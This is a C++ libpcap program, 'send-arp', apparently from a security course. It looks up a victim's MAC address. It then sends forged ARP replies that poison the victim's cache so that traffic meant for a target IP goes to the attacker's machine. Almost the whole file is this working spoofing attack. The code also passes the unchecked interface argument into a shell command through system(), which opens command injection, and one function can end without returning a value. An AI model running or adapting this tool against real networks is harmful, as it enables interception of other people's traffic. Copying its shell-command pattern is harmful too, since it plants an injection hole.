#include <cstdio>
#include <errno.h>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <string.h>
#include <string.h>
#include <string>
#include <unistd.h>
#include <stdint.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
    cout << "syntax: ./send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n";
    cout << "sample: ./send-arp ens33 192.168.200.200 192.168.200.254\n";
}

// Why ioctl doesn't run well?
/*
char* get_my_mac(const char *interface)
{
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0)
    {
        perror("[get_my_mac] socket: ");
        exit(0);
    }

    strncpy(ifr.ifr_name, interface, strlen(interface));
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);                   // error: No such device. why??
    if(ret < 0)
    {
        perror("[get_my_mac] ioctl: ");
        close(sockfd);
        exit(0);
    }

    close(sockfd);
    cout << ifr.ifr_hwaddr.sa_data << std::endl;
    return ifr.ifr_hwaddr.sa_data;
}
*/

string extract_mac(const u_char *p)
{
    EthArpPacket *packet = (EthArpPacket *) p;

    if(packet->eth_.type() != EthHdr::Arp)
        return "";
    if(packet->arp_.op_ != htons(ArpHdr::Reply))
        return "";

    return packet->eth_.smac_.str();
}

string get_mac(const char *interface, Mac* my_mac, Ip* my_ip, Ip* sender_ip)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		exit(0);
	}

    //  Packet Send
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");		// broadcast
	packet.eth_.smac_ = Mac(my_mac->str());		        // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);			// Request
	packet.arp_.smac_ = Mac(my_mac->str());		        // my mac
	packet.arp_.sip_ = htonl(Ip(my_ip->str()));	        // my ip
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");		// Unknown
	packet.arp_.tip_ = htonl(Ip(sender_ip->str()));	    // sender ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

    // Packet receive
    while (true) {
		struct pcap_pkthdr* header;
		const u_char* p;
		int res = pcap_next_ex(handle, &header, &p);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		string you_mac = extract_mac(p);
        if(you_mac.empty())
            continue;
        
        return you_mac;
	}
}


bool infection(const char *interface, Mac* my_mac, Ip* my_ip, Mac* sender_mac, Ip* sender_ip, Ip* target_ip)
{
    char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return false;
	}

    //  Packet Send
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac->str());		      // sender mac
	packet.eth_.smac_ = Mac(my_mac->str());  		      // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);			  	  // Reply
	packet.arp_.smac_ = Mac(my_mac->str());	        	  // my mac
	packet.arp_.sip_ = htonl(Ip(target_ip->str()));	      // target ip
	packet.arp_.tmac_ = Mac(sender_mac->str());		      // sender mac
	packet.arp_.tip_ = htonl(Ip(sender_ip->str()));  	  // sender ip

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

    return true;
}


int main(int argc, char *argv[])
{
    if(argc<3 || argc%2)
    {
        usage();
        return 0;
    }

    const char* interface = argv[1];
    Mac my_mac;
    Ip my_ip;

    // Get my mac
    string command = "cat /sys/class/net/";
    command = command.append(interface);
    command = command.append("/address > my_mac");
    system(command.c_str());
    ifstream openFile("my_mac");
    string temp;
    getline(openFile, temp);
    my_mac = Mac(temp);
    system("rm my_mac");


    // Get my ip
    command = "hostname -I > my_ip";
    system(command.c_str());
    ifstream openFile2("my_ip");
    getline(openFile2, temp);
    char *c = (char *)temp.c_str();
    my_ip = Ip(strtok(c, " "));



    // Get mac and Infection
    for(int i=2; i<argc; i+=2)
    {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i+1]);
 
        // Get sender mac
        Mac sender_mac = Mac(get_mac(interface, &my_mac, &my_ip, &sender_ip));
        cout << sender_mac.str() << endl;

        // Attack
        if(!infection(interface, &my_mac, &my_ip, &sender_mac, &sender_ip, &target_ip))
        {
            cout << "Case " << i/2 << ": failed" << endl;
        }
    }

    return 0;
}